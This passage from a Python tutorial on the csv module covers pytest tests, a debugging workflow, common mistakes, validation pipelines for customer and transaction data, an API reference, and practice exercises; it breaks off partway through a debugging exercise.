mirroring
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§23 pattern, now specific to CSV. **Type hints** — `Path` (from
[02-pathlib-and-portable-paths.md](02-pathlib-and-portable-paths.md)),
and `Iterator[...]` (rather than `list[...]`) for the *reading*
functions specifically, to communicate and preserve their laziness
(§28). **Lazy iteration** — `yield from reader` makes `read_csv_rows`
and `read_csv_dicts` themselves **generators**
([Iterables, Iterators, and Generators](../09-Advanced-Production-Oriented-Python-Foundations/01-iterables-iterators-and-generators.md)'s
own dedicated subject, previewed here in practical use) — calling one
does not read the file immediately; it only starts reading, one row at
a time, once the caller actually iterates the result, preserving §28's
memory guarantees all the way out to this reusable function's own
callers. **Error handling** — deliberately left to propagate (exactly
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§28.3 principle), since a low-level, reusable utility function is
rarely the right place to decide how a caller should react to a missing
file or malformed CSV. **Validation** — deliberately *not* included
here; validation (§30) is a separate, distinct responsibility, layered
on top of these functions by calling code (§51–§52 demonstrate this
layering concretely). **Dependency boundaries** — these four functions
form the *only* place in a well-designed program that directly imports
and calls `csv`/`open()` for this purpose; everything else works with
already-read Python data.

## 42. Testing

### 42.1 Why `tmp_path`, restated for CSV specifically

Exactly
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§39 and
[02-pathlib-and-portable-paths.md](02-pathlib-and-portable-paths.md)'s
§33: CSV-processing tests should never touch real project files —
`pytest`'s `tmp_path` fixture provides a fresh, isolated directory per
test.

### 42.2 Testing a basic read and write

```python
import csv


def test_write_then_read_csv_round_trips(tmp_path):
    path = tmp_path / "data.csv"

    with path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["name", "age"])
        writer.writerow(["Alice", "30"])

    with path.open("r", newline="", encoding="utf-8") as f:
        reader = csv.reader(f)
        rows = list(reader)

    assert rows == [["name", "age"], ["Alice", "30"]]
```

### 42.3 Testing headers, quoted fields, and embedded commas

```python
def test_quoted_field_with_embedded_comma(tmp_path):
    path = tmp_path / "data.csv"
    path.write_text('name,city\nAlice,"New York, NY"\n', newline="", encoding="utf-8")

    with path.open("r", newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        row = next(reader)

    assert row["city"] == "New York, NY"
```

### 42.4 Testing multiline fields

```python
def test_multiline_quoted_field(tmp_path):
    path = tmp_path / "data.csv"
    path.write_text('id,comment\n1,"Hello\nWorld"\n', newline="", encoding="utf-8")

    with path.open("r", newline="", encoding="utf-8") as f:
        rows = list(csv.reader(f))

    assert rows[1] == ["1", "Hello\nWorld"]
```

### 42.5 Testing missing values, malformed data, and duplicate IDs

```python
def test_missing_trailing_field_uses_restval(tmp_path):
    path = tmp_path / "data.csv"
    path.write_text("name,age,city\nBob,25\n", newline="", encoding="utf-8")

    with path.open("r", newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f, restval="MISSING")
        row = next(reader)

    assert row["city"] == "MISSING"


def test_strict_mode_raises_on_malformed_row(tmp_path):
    path = tmp_path / "bad.csv"
    path.write_text('name,city\nAlice,"broken\n', newline="", encoding="utf-8")

    with path.open("r", newline="", encoding="utf-8") as f:
        reader = csv.reader(f, strict=True)
        with pytest.raises(csv.Error):
            list(reader)


def test_find_duplicate_ids_detects_repeats():
    rows = [{"id": "1"}, {"id": "2"}, {"id": "1"}]
    assert find_duplicate_ids(rows, "id") == {"1"}
```

### 42.6 Testing empty CSV and header-only CSV

```python
def test_empty_file_yields_no_rows(tmp_path):
    path = tmp_path / "empty.csv"
    path.write_text("", newline="", encoding="utf-8")

    with path.open("r", newline="", encoding="utf-8") as f:
        rows = list(csv.reader(f))

    assert rows == []


def test_header_only_file_yields_no_data_rows(tmp_path):
    path = tmp_path / "header_only.csv"
    path.write_text("name,age\n", newline="", encoding="utf-8")

    with path.open("r", newline="", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))

    assert rows == []
```

### 42.7 A large-ish input test

```python
def test_processes_many_rows(tmp_path):
    path = tmp_path / "many_rows.csv"
    lines = ["id,value\n"] + [f"{i},{i * 2}\n" for i in range(5000)]
    path.write_text("".join(lines), newline="", encoding="utf-8")

    with path.open("r", newline="", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))

    assert len(rows) == 5000
```

## 43. Debugging

### 43.1 A systematic thirteen-step workflow

1. **Inspect the raw file contents** — read it as plain text first,
   before assuming anything about its CSV structure.
2. **Inspect the encoding** — is `encoding="utf-8"` (or `"utf-8-sig"`,
   §26.4) actually correct for this file's real origin?
3. **Inspect newline behavior** — was the file opened with
   `newline=""` (§26.2)?
4. **Inspect the delimiter** — is it really a comma, or something else
   entirely (§6)?
5. **Inspect the quote character** — is it really `"`, or something
   else (§13.2)?
6. **Inspect escape behavior** — doubled quotes, or a dedicated
   `escapechar` (§7.4)?
7. **Inspect the dialect** — are you explicitly passing one, or
   relying on the `'excel'` default — and does that default actually
   match this file (§20)?
8. **Inspect row lengths** — use `len(row)` on a few rows to confirm
   every row has the expected number of fields.
9. **Inspect the header** — does `reader.fieldnames` (for
   `DictReader`) actually match what the rest of your code assumes
   (§31.3)?
10. **Inspect data types** — is a field you assumed was numeric text
    actually parseable (§33)?
11. **Reproduce with a tiny CSV** — hand-write a two- or three-row file
    containing exactly the suspicious pattern, in isolation.
12. **Use `repr()` to reveal hidden characters** — `print(repr(row))`
    instead of `print(row)` makes stray whitespace, `\r`, and `﻿`
    (§26.4) visible, rather than invisible.
13. **Verify reader/writer configuration explicitly** — print
    `reader.dialect.delimiter`, `reader.dialect.quotechar`, and similar,
    rather than assuming your configuration was applied correctly.

### 43.2 Realistic debugging examples

**"Every row has one giant field instead of several."** Step 4 — the
delimiter is almost certainly wrong (§6.4's `delimiter=` fix).
**"My `DictReader` code raises `KeyError` on a column I can clearly see
in the file."** Step 9 and step 12 together — `repr(reader.fieldnames)`
very often reveals a stray BOM character (§26.4) or unexpected leading/
trailing whitespace in the header text itself.
**"A field that should be numeric fails to convert, for only some
rows."** Step 10 and step 12 — `repr(value)` on the failing row usually
reveals an unexpected character (a stray currency symbol, a thousands
separator like a comma inside an unquoted numeric field, or trailing
whitespace) that a plain `print(value)` would not make visible.

## 44. Common Mistakes

**1. Using `split(",")` to parse CSV.**
Directly §9.1's worked example — breaks on quoted fields containing the
delimiter. **Better:** always use `csv.reader`/`csv.DictReader` (§9.2).

**2. Forgetting `newline=""`.**
Directly §26.2's explanation — risks corrupted line-ending handling on
both read and write, especially for embedded-newline fields and
`csv.writer`'s own `\r\n` terminator (§15.2).

**3. Forgetting `encoding=`.**
Relies on a platform-dependent default — always specify
`encoding="utf-8"` explicitly (§26.3).

**4. Assuming everything is numeric.**
Attempting `int(value)`/`float(value)` on every field without checking
first — use the deliberate, error-reporting conversion functions from
§33.1 instead.

**5. Assuming an empty field means `None`.**
CSV has no such universal convention (§32.1) — define your own missing-
value handling explicitly (§32.3).

**6. Loading huge files into memory.**
Directly §28.1's `list(reader)` warning — stream instead (§28.2).

**7. Assuming all CSVs use commas.**
Directly §6's entire section — always confirm (or configure) the
actual delimiter in use.

**8. Assuming headers always exist.**
Directly §5.1 and §17.2's `fieldnames=` explanation — a header-less
file silently loses its first real data row if you forget to supply
`fieldnames` explicitly.

**9. Ignoring malformed rows.**
Directly §24.4's principle — malformed data should be counted and
reported, never silently discarded.

**10. Using `DictReader` without validating headers.**
Directly §31.3's warning — a silently renamed or reordered column can
flow through undetected without an explicit header check.

**11. Silently ignoring extra fields.**
Directly §19.3's `extrasaction="ignore"` warning — a deliberate,
documented choice only, never a default reflex.

**12. Blindly trusting `Sniffer`.**
Directly §27.4's warning — validate its guessed dialect before
committing to it in a production path.

**13. Not validating types.**
Trusting that a "numeric-looking" column is actually always numeric,
without the explicit conversion-and-validation step (§30, §33).

**14. Writing CSV manually (string concatenation) instead of using
`csv.writer`.**
```python
# BAD
line = f"{name},{age},{city}\n"
```
→ Breaks the moment any value itself contains a comma, a quote, or a
newline — exactly the same class of bug §9.1 demonstrated for reading,
now on the writing side. **Better:** `writer.writerow([name, age, city])`
— `csv.writer` quotes automatically, only when needed (§22.1).

**15. Not considering spreadsheet formula injection.**
Directly §37's entire section — exporting untrusted text directly into
CSV fields that may later be opened in spreadsheet software.

**16. Assuming CSV is a database.**
Directly §38.2 — no transactions, no enforced relationships, no
concurrency safety.

**17. Using the wrong delimiter.**
Directly mistake 7, restated — confirm before assuming.

**18. Ignoring quoting rules when hand-inspecting or hand-editing CSV
data.**
Manually "fixing" a CSV file in a plain text editor without
understanding §7's quoting rules can easily produce a file that
*looks* fine but is now genuinely malformed (an unmatched quote, for
example) — when in doubt, use `csv.writer` to regenerate a corrected
file programmatically instead of hand-editing raw text.

## 45. Bad vs. Good Code

```python
# BAD -- naive string splitting
for line in file:
    values = line.split(",")

# GOOD -- quote-aware parsing
reader = csv.reader(file)
for row in reader:
    values = row
```
**Why:** §9's entire argument — `.split(",")` has no concept of
quoting, escaping, or embedded newlines.

```python
# BAD -- for a large file, loads everything into memory first
rows = list(reader)
for row in rows:
    process(row)

# GOOD -- streams, one row at a time
for row in reader:
    process(row)
```
**Why:** §28.1–§28.2 — `csv.reader` is already a lazy iterator; forcing
it into a list defeats that benefit for no reason, unless you
genuinely need multiple passes or random access to the full data.

```python
# BAD -- missing newline="" when opening for csv.writer
with open("output.csv", "w", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["name", "age"])

# GOOD
with open("output.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["name", "age"])
```
**Why:** §15.2/§26.2 — without `newline=""`, `csv.writer`'s own
`\r\n` line terminator can interact badly with Python's own separate
newline-translation layer, risking doubled line endings on some
platforms.

```python
# BAD -- extrasaction left at its dangerous-looking default without thinking about it, in a context
# where the writer's fieldnames are narrower than the data actually available
writer = csv.DictWriter(f, fieldnames=["name", "age"])
writer.writerow({"name": "Alice", "age": 30, "city": "London"})   # raises ValueError, unexpectedly, in production

# GOOD -- the mismatch is caught during development, and handled deliberately
writer = csv.DictWriter(f, fieldnames=["name", "age", "city"])     # fieldnames actually matches the real data
writer.writerow({"name": "Alice", "age": 30, "city": "London"})
```
**Why:** §19.3 — the *default* `extrasaction="raise"` is correct
behavior surfacing a real mismatch; the fix is aligning `fieldnames`
with your actual data shape (or making a deliberate, explicit decision
to use `extrasaction="ignore"`), not silencing the symptom.

## 46. End-to-End Examples

### 46.1 Example 1 — Customer CSV Quality Checker

```python
import csv
from pathlib import Path

REQUIRED_COLUMNS = ["customer_id", "name", "email", "age"]   # ordered: also the output column order


def load_and_check(input_path: Path, clean_path: Path, rejected_path: Path) -> dict[str, int]:
    with input_path.open("r", newline="", encoding="utf-8") as infile:
        reader = csv.DictReader(infile)

        # 1. Validate headers before processing a single row.
        missing_columns = set(REQUIRED_COLUMNS) - set(reader.fieldnames or [])
        if missing_columns:
            raise ValueError(f"Missing required columns: {missing_columns}")

        valid_rows: list[dict[str, str]] = []
        rejected_rows: list[dict[str, str]] = []

        for row in reader:
            # 2. Validate required fields and convert types.
            errors = []
            # A short (ragged) row gives None for absent fields.
            if not (row["customer_id"] or "").strip():
                errors.append("missing customer_id")
            if not (row["name"] or "").strip():
                errors.append("missing name")
            try:
                age = int((row["age"] or "").strip())
                if age < 0 or age > 130:
                    errors.append("implausible age")
            except ValueError:
                errors.append("invalid age")

            # 3. Route the row based on validation outcome.
            if errors:
                row_with_errors = dict(row)
                row_with_errors["errors"] = "; ".join(errors)
                rejected_rows.append(row_with_errors)
            else:
                valid_rows.append(row)

    # 4. Write cleaned output.
    with clean_path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=REQUIRED_COLUMNS)
        writer.writeheader()
        writer.writerows(valid_rows)

    # 5. Write rejected records, including why each was rejected.
    with rejected_path.open("w", newline="", encoding="utf-8") as f:
        fieldnames = REQUIRED_COLUMNS + ["errors"]
        writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
        writer.writeheader()
        writer.writerows(rejected_rows)

    # 6. Report a summary.
    return {"valid": len(valid_rows), "rejected": len(rejected_rows)}
```

**Section by section:** header validation happens *immediately* after
opening the reader, before any row is processed (§31.3); each row is
validated and converted in one pass, collecting every problem rather
than stopping at the first (§30.2's pattern); valid and rejected rows
are routed to two entirely separate output files, with rejected rows
carrying an explicit `errors` explanation rather than vanishing
silently (§24.3); the function returns a small summary dictionary,
giving the caller (or a CLI wrapper, §06's future subject) something
concrete to report.

### 46.2 Example 2 — Advanced: Transaction Ingestion Pipeline

```python
import csv
from dataclasses import dataclass
from pathlib import Path
from typing import Iterator


@dataclass
class IngestResult:
    total_rows: int
    valid_rows: int
    rejected_rows: int


def _read_rows(path: Path) -> Iterator[dict[str, str]]:
    with path.open("r", newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f, dialect="excel")
        if reader.fieldnames is None:
            raise ValueError(f"{path} appears to be empty")

        required = {"transaction_id", "customer_id", "amount", "currency"}
        missing = required - set(reader.fieldnames)
        if missing:
            raise ValueError(f"{path} is missing required columns: {missing}")

        yield from reader


def _validate_and_convert(row: dict[str, str]) -> tuple[dict[str, object] | None, list[str]]:
    errors: list[str] = []

    # A short (ragged) row gives None for absent fields.
    transaction_id = (row["transaction_id"] or "").strip()
    if not transaction_id:
        errors.append("missing transaction_id")

    amount_text = (row["amount"] or "").strip()
    amount = None
    if not amount_text:
        errors.append("missing amount")
    else:
        try:
            amount = float(amount_text)
            if amount <= 0:
                errors.append("amount must be positive")
        except ValueError:
            errors.append("invalid amount")

    currency = (row["currency"] or "").strip().upper()
    if not currency:
        errors.append("missing currency")
    elif currency not in {"USD", "EUR", "GBP"}:
        errors.append(f"unsupported currency: {currency!r}")

    if errors:
        return None, errors

    return {
        "transaction_id": transaction_id,
        "customer_id": (row["customer_id"] or "").strip(),
        "amount": amount,
        "currency": currency,
    }, []


def ingest_transactions(input_path: Path, clean_path: Path, reject_path: Path) -> IngestResult:
    total = valid = rejected = 0

    with clean_path.open("w", newline="", encoding="utf-8") as clean_file, \
         reject_path.open("w", newline="", encoding="utf-8") as reject_file:

        clean_writer = csv.DictWriter(
            clean_file,
            fieldnames=["transaction_id", "customer_id", "amount", "currency"],
        )
        clean_writer.writeheader()

        reject_writer = csv.DictWriter(
            reject_file,
            fieldnames=["transaction_id", "customer_id", "amount", "currency", "errors"],
            extrasaction="ignore",
        )
        reject_writer.writeheader()

        for raw_row in _read_rows(input_path):
            total += 1
            converted, errors = _validate_and_convert(raw_row)

            if converted is None:
                rejected += 1
                reject_writer.writerow({**raw_row, "errors": "; ".join(errors)})
                continue

            valid += 1
            clean_writer.writerow(converted)

    return IngestResult(total_rows=total, valid_rows=valid, rejected_rows=rejected)
```

**Architecture:** `_read_rows` (streaming input plus header validation,
§28/§31.3), `_validate_and_convert` (pure — no I/O at all, easily
tested in complete isolation, §42), and `ingest_transactions` (the thin
orchestration layer, §32's separation-of-concerns principle applied at
pipeline scale). **Error handling:** a structurally invalid *file*
(missing columns, empty file) fails fast, immediately, via a raised
`ValueError`; a structurally invalid *row* is quarantined individually,
without aborting the rest of the run (§24.3). **Memory usage:** both
`_read_rows` and the main loop stream row by row — the *entire* file is
never held in memory at once, regardless of its number of rows
(§28.2–§28.3).
**Data quality:** every rejected row carries its specific error
reasons, rather than a bare "invalid" flag. **Logging boundaries:**
this example deliberately returns a structured `IngestResult` rather
than printing directly — the caller decides how to report it (to the
console, to a logging system once
[08-logging-versus-print.md](08-logging-versus-print.md) is covered, or
to a monitoring dashboard) — exactly the same "don't decide the
recovery/reporting strategy inside a low-level function" principle
already established in §41.2. **Test strategy:** `_validate_and_convert`
is tested directly, with plain dictionaries, no file I/O at all;
`ingest_transactions` is tested end-to-end with `tmp_path`, checking
both output files' final contents and the returned `IngestResult`'s
counts (§42's patterns, applied together). This example deliberately
uses **only the standard library** — no third-party dataframe tools —
because the purpose here is mastering exactly what `csv`, `pathlib`,
and plain Python already provide.

## 47. Advanced API Reference

No invented APIs — every entry below is a genuine, documented member of
Python's `csv` module.

### 47.1 Module-level functions

| API | Purpose | Basic syntax | Key parameters | Returns | Caveat |
|---|---|---|---|---|---|
| `csv.reader` | Parse rows from a text stream | `csv.reader(f, dialect='excel', **fmtparams)` | `delimiter`, `quotechar`, `quoting`, `strict`, ... (§13) | A reader iterator, yielding `list[str]` per row | Requires an already-open iterable, not a path (§13.2) |
| `csv.writer` | Write rows to a text stream | `csv.writer(f, dialect='excel', **fmtparams)` | `delimiter`, `lineterminator`, `quoting`, ... (§15) | A writer object with `.writerow()`/`.writerows()` | Open the file with `newline=""` (§26.2) |
| `csv.DictReader` | Parse rows as dictionaries | `csv.DictReader(f, fieldnames=None, restkey=None, restval=None, dialect='excel')` | `fieldnames`, `restkey`, `restval` (§17) | An iterator yielding a `dict` per row (values are `str` by default; `restval`/`restkey` can yield `None` or `list[str]`, and some `quoting` settings numbers) | Duplicate header names silently overwrite (§34.1) |
| `csv.DictWriter` | Write dictionaries as rows | `csv.DictWriter(f, fieldnames, restval='', extrasaction='raise', dialect='excel')` | `fieldnames` (required), `restval`, `extrasaction` (§19) | A writer object with `.writeheader()`/`.writerow()`/`.writerows()` | `fieldnames` is mandatory, unlike `DictReader`'s |
| `csv.register_dialect` | Name a reusable formatting configuration | `csv.register_dialect(name, dialect=None, **fmtparams)` | Any `fmtparams` (§13.1/§15.1) | `None` | Overwrites a name if already registered |
| `csv.unregister_dialect` | Remove a registered dialect | `csv.unregister_dialect(name)` | — | `None` | Raises `csv.Error` if the name was never registered |
| `csv.get_dialect` | Retrieve a registered dialect object | `csv.get_dialect(name)` | — | A `Dialect`-derived object | Raises `csv.Error` for an unregistered name |
| `csv.list_dialects` | List every registered dialect name | `csv.list_dialects()` | — | `list[str]` | Includes the three built-ins (§20.2) |
| `csv.field_size_limit` | Get/set the maximum single-field size | `csv.field_size_limit([new_limit])` | `new_limit` (optional) | The *previous* limit, as `int` | Raise deliberately, only after confirming legitimacy (§25.3) |

### 47.2 Classes

| API | Purpose | Caveat |
|---|---|---|
| `csv.Dialect` | Base class documenting a dialect's formatting attributes | Not typically instantiated directly — subclass it, or use `register_dialect` (§21) |
| `csv.excel` | The built-in `'excel'` dialect, as a class | Comma-delimited, `\r\n`, `QUOTE_MINIMAL` |
| `csv.excel_tab` | The built-in `'excel-tab'` dialect, as a class | Tab-delimited variant of `excel` |
| `csv.unix_dialect` | The built-in `'unix'` dialect, as a class | `\n` terminator, `QUOTE_ALL` |
| `csv.Sniffer` | Heuristic dialect/header detection | `.sniff()`/`.has_header()` — inference, not guaranteed (§27) |
| `csv.Error` | The module's own exception type | Raised for malformed strict-mode syntax, unregistered dialects, and related misconfiguration (§24.2) |

### 47.3 Quoting constants

| Constant | Behavior | Version note |
|---|---|---|
| `csv.QUOTE_MINIMAL` | Quote only when structurally necessary (the default) | Available on every supported version |
| `csv.QUOTE_ALL` | Quote every field, always | Available on every supported version |
| `csv.QUOTE_NONNUMERIC` | Quote non-numeric fields on write; auto-convert unquoted fields to `float` on read | Available on every supported version |
| `csv.QUOTE_NONE` | Never quote; requires `escapechar` for fields containing the delimiter | Available on every supported version |
| `csv.QUOTE_NOTNULL` | Finer-grained control distinguishing `None` from strings | **Added in Python 3.12** — niche; verify exact behavior against your Python version's docs before relying on it |
| `csv.QUOTE_STRINGS` | Finer-grained control specifically quoting string values | **Added in Python 3.12** — niche; same caveat as above |

## 48. Performance

### 48.1 Two approaches, compared

```python
# Approach A -- materialize everything up front
rows = list(reader)
for row in rows:
    process(row)
```

```python
# Approach B -- stream
for row in reader:
    process(row)
```

### 48.2 Time and memory, conceptually

**Time:** both approaches ultimately parse every row exactly once — the
*total* parsing work is the same either way; Approach A simply performs
all of it up front, before any processing begins, while Approach B
interleaves parsing and processing, one row at a time. **Memory:**
Approach A's memory usage grows linearly with the *total* number of
rows, held simultaneously; Approach B's memory usage stays roughly
constant with respect to the number of rows the file ultimately contains —
exactly
[01-reading-and-writing-text-files.md](01-reading-and-writing-text-files.md)'s
§20 lesson, restated for CSV specifically (§28 already developed this
in full).

### 48.3 When materializing into a list is reasonable

- The file is genuinely small, and known to stay small.
- The processing logic genuinely needs **multiple passes** over the
  same data (e.g. one pass to compute an average, a second pass to
  compare each row against it) — re-reading the file from disk twice is
  also an option, but holding a reasonably small dataset in memory once
  is often simpler and just as reasonable.
- **Sorting** is required — Python's `sorted()` inherently needs the
  full sequence available at once; there is no way to sort a truly
  unbounded stream without first materializing it (or using an external,
  disk-based sorting technique, outside this chapter's scope).

### 48.4 Repeated passes and sorting limitations, briefly

A pure streaming approach fundamentally **cannot** sort or compute
anything requiring the *entire* dataset's shape to be known before the
first row can be fully processed (a running total is fine streamed;
"the median value" is not, without either materializing the data or
using more advanced, out-of-scope streaming-statistics techniques) —
recognizing which category a given task falls into is itself part of
choosing correctly between Approach A and Approach B.

## 49. Mini-Projects

### Mini Project 1 — CSV Inspector

**Problem statement:** build a tool that reports basic facts about an
unfamiliar CSV file.

**Requirements:** read a CSV file; display its headers; count its data
rows; show a handful of sample rows; attempt to detect the delimiter
(§27, validated rather than trusted blindly); handle errors (missing
file, empty file, `csv.Error`) gracefully.

**Expected behavior:** running against a normal file reports headers,
row count, and a sample; running against a malformed or empty file
reports a clear, specific problem instead of crashing with a raw
traceback.

**Suggested architecture:** a small set of focused functions
(`read_headers`, `count_rows`, `sample_rows`, `detect_delimiter`), each
independently testable — directly §41's reusable-utility pattern.

**Constraints:** must not load an arbitrarily large file entirely into
memory just to count its rows (§28, §48).

**Edge cases:** an empty file; a header-only file; a file using an
unusual delimiter.

**Testing requirements:** `tmp_path`-based tests (§42) for each of the
edge cases above.

**Extension challenge:** report each column's apparent type (numeric
vs. text) based on sampling its values.

### Mini Project 2 — CSV Data Cleaner

**Problem statement:** clean a messy CSV file into a well-formed one.

**Requirements:** validate the header against an expected column set
(§31.3); normalize whitespace in every text field; convert numeric
columns using the deliberate conversion functions from §33; handle
missing values according to an explicit, documented convention (§32);
separate genuinely valid records from invalid ones (§46.1's pattern);
write a cleaned output CSV.

**Expected behavior:** a row with a fixable issue (extra whitespace) is
cleaned and kept; a row with a genuine problem (invalid type, missing
required field) is routed to a separate rejected-records output.

**Suggested architecture:** exactly §46.1's shape — read, validate/
convert (returning either a cleaned row or a list of errors), route,
write.

**Constraints:** every conversion decision must be explicit and
testable in isolation from any file I/O.

**Edge cases:** a row that's *almost* valid except for one field; a
completely empty input file; every row being invalid.

**Testing requirements:** at least one test per validation rule,
following §42's patterns.

**Extension challenge:** make the expected column set and missing-value
markers configurable, rather than hardcoded.

### Mini Project 3 — CSV Data Quality Reporter

**Problem statement:** produce a summary data-quality report for a CSV
file, without altering it.

**Requirements:** per-column statistics (count of non-missing values);
missing-value counts per column (§32); duplicate-record detection
(§34.3) and duplicate-ID detection for a specified key column (§34.2);
invalid-value counts per column, against a specified type/rule per
column; row-length inconsistency detection (rows with too many or too
few fields relative to the header); a single, deterministic summary
report (as either a printed report or a small CSV/text output of its
own).

**Expected behavior:** two runs against the same, unchanged input file
produce identical reports (§48/§12.4-style determinism, i.e. no
dependence on dictionary/set iteration order where it would matter for
output).

**Suggested architecture:** one function per statistic, each accepting
already-loaded row data (not reopening the file itself) — allowing the
statistics themselves to be tested against small, hand-built row lists
with no file I/O at all.

**Constraints:** be explicit about whether each statistic requires a
single pass or genuinely needs the whole dataset in memory (§48.3) —
and justify that choice for each one.

**Edge cases:** a column that is present in the header but never
appears with a value in any row; a file with zero data rows.

**Testing requirements:** a test per statistic function, plus one
end-to-end test with a small, deliberately messy fixture file.

**Extension challenge:** support checking multiple candidate key
columns for duplicates in a single run.

### Mini Project 4 — Transaction Ingestion Pipeline

**Problem statement:** build a more complete, production-oriented
version of §46.2's advanced example.

**Requirements:** streaming input (§28); schema validation against
required columns (§31); type conversion with explicit error messages
(§33); business-rule validation beyond mere type-correctness (e.g. an
`amount` must be positive, a `currency` must be from an allowed set,
exactly as §46.2 demonstrated); clean output and reject output, each
with a header; summary metrics returned as structured data (not just
printed); a `pytest` suite (§42) covering the full range from §42.2
through §42.7, adapted to this pipeline's actual schema; production-
oriented error handling — a structurally broken file fails fast; an
individually bad row is quarantined, never silently dropped (§24.3).

**Expected behavior:** matches §46.2's `ingest_transactions` behavior,
built by you from the requirements above rather than copied directly.

**Suggested architecture:** §46.2's three-layer shape (streaming
reader, pure validate/convert function, thin orchestration) is a strong
starting point — you are encouraged to adapt, not merely reproduce, it.

**Constraints:** the pure validation/conversion logic must be testable
with zero file I/O.

**Edge cases:** a file where every single row is invalid; a file with
one row containing an amount of exactly `0` (decide, deliberately,
whether that is valid); a currency value in unexpected casing
(`"usd"` vs. `"USD"`).

**Testing requirements:** the full test suite described above, plus at
least one test asserting the exact contents of *both* output files
after a mixed-validity input run.

**Extension challenge:** add duplicate `transaction_id` detection
(§34.2) as an additional rejection reason, and report it distinctly in
the summary metrics from other kinds of validation failure.

## 50. Coding Exercises

### Level 1 — Foundation

1. Read a CSV file's rows with `csv.reader` and print each one.
2. Print a CSV file's header row alone, without processing any data
   rows.
3. Count the number of data rows in a CSV file (excluding the header).
4. Access a specific column's value from each row, by index, using
   `csv.reader`.
5. Write a small CSV file (header plus at least two data rows) using
   `csv.writer`.
6. Read the same file back using `csv.DictReader`, and print one
   named column's values.
7. Write a CSV file using `csv.DictWriter`, including a call to
   `.writeheader()`.

### Level 2 — Practical

8. Filter rows matching a condition (e.g. a `status` column equal to a
   specific value) and print only those.
9. Convert a numeric column to `float` for every row, using one of
   §33's deliberate conversion functions, and compute its total.
10. Group rows by a category column and count how many rows fall into
    each group.
11. Detect duplicate values in an "ID"-style column (§34.2).
12. Validate that a CSV file's header contains every column your
    program requires, raising a clear error if not (§31.3).

### Level 3 — Engineering

13. Stream a large (or large-ish, generated) CSV file, computing a
    running total without ever calling `list(reader)` (§28.2).
14. Validate an entire CSV file against a schema of your own design
    (required columns, expected types per column, §31.2), reporting
    every violation found.
15. Split a CSV file's rows into two separate output files — "clean"
    and "rejected" — based on your own validation rules (§46.1's
    pattern, applied to data of your choosing).
16. Build at least two of §41's reusable CSV functions yourself, with
    full type hints.
17. Write `pytest` tests, using `tmp_path`, for at least three of your
    functions from Levels 2–3.

### Level 4 — Advanced

18. Register and use a custom dialect (§20.4) for a non-comma-delimited
    file of your own creation.
19. Use `csv.Sniffer` to guess a file's dialect, then write a
    validation check confirming the guess actually matches your
    expectations before trusting it (§27.4).
20. Build a full streaming transformation pipeline (read → validate →
    convert → transform → write) for a dataset of your choosing,
    following §29's shape.
21. Implement the CSV-to-CSV join pattern from §36 for two files of
    your own design, correctly handling at least one missing-key case.
22. Implement error classification: distinguish, in your validation
    output, between at least three genuinely different *kinds* of row
    failure (missing field vs. invalid type vs. business-rule
    violation), rather than one generic "invalid" bucket.
23. Implement the CSV-injection mitigation from §37.3, and write a
    test proving a value beginning with `=` is correctly neutralized in
    the output.
24. Build a small, production-oriented ingestion pipeline module,
    bringing together streaming, schema validation, type conversion,
    business rules, clean/reject output, and a `pytest` suite — your
    own version of Mini Project 4 (§49), extended with at least one
    capability not explicitly required there.

## 51. Debugging Exercises

Each snippet below is broken. Diagnose using §43's workflow before
reading the corrected version.

**1. `split(",")` parsing bug.**
```python
for line in open("data.csv", encoding="utf-8"):
    fields = line.strip().split(",")
```
*Diagnose:* what happens on a row like `Alice,"New York, NY",30`?
*Corrected:* use `csv.reader` (§9.2).

**2. Incorrect newline handling.**
```python
with open("output.csv", "w", encoding="utf-8") as f:
    writer = csv.writer(f)
```
*Diagnose:* what's missing from the `open()` call (§26.2)?
*Corrected:* add `newline=""`.

**3. Incorrect delimiter.**
```python
with open("semicolon_data.csv", "r", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)   # file actually uses ";" as its delimiter
```
*Diagnose:* what would `len(row)` reveal for each parsed row? *Corrected:*
`csv.reader(f, delimiter=";")`.

**4. A quote-parsing issue.**
```python
reader = csv.reader(f, quotechar="'")   # file actually uses double quotes
```
*Diagnose:* what does `repr(row)` reveal about the parsed content of a
field that should have been quoted? *Corrected:* match `quotechar` to
what the file actually uses (the default `'"'`, here).

**5. A missing header.**
```python
# The file has NO header row at all -- every line is genuine data.
reader = csv.DictReader(f)
```
*Diagnose:* which real data row silently disappeared, treated as a
header instead (§17.2)? *Corrected:* supply `fieldnames=[...]`
explicitly.

**6. Invalid type conversion.**
```python
total = sum(int(row["amount"]) for row in reader)
```
*Diagnose:* what happens the moment one row's `"amount"` is `"12.50"`
(a valid *float*, but not a valid `int`)? *Corrected:* use `float(...)`,
or §33.1's `parse_float` with clear error reporting.

**7. Malformed CSV, undetected.**
```python
reader = csv.reader(f)   # strict=False, the default
```
*Diagnose:* would a genuinely malformed row (an unmatched quote) be
caught here at all? *Corrected:* `csv.reader(f, strict=True)`, if
loud, immediate rejection of malformed syntax is actually desired
(§24.1).

**8. Incorrect `DictWriter` fieldnames.**
```python
writer = csv.DictWriter(f, fieldnames=["name", "email"])
writer.writerow({"name": "Alice", "age": 30})   # "age" isn't in fieldnames; "email" is missing from the dict
```
*Diagnose:* what does `writer.writerow(...)` actually do with the
`"age"` key here, and what appears in the `email` column (§19.2–§19.3)?
*Corrected:* align `fieldnames` with the real data shape, deliberately.

**9. Silently ignored extra fields.**
```python
writer = csv.DictWriter(f, fieldnames=["name", "age"], extrasaction="ignore")
writer.writerow({"name": "Alice", "age": 30, "city": "London"})
```
*Diagnose:* where did the `"city"` value go? *Corrected:* either widen
`fieldnames` to include `"city"`, or confirm `"ignore"` is genuinely,
deliberately intended here (§19.3).

**10. A huge CSV loaded into memory unnecessarily.**
```python
rows = list(csv.reader(open("huge.csv", newline="", encoding="utf-8")))
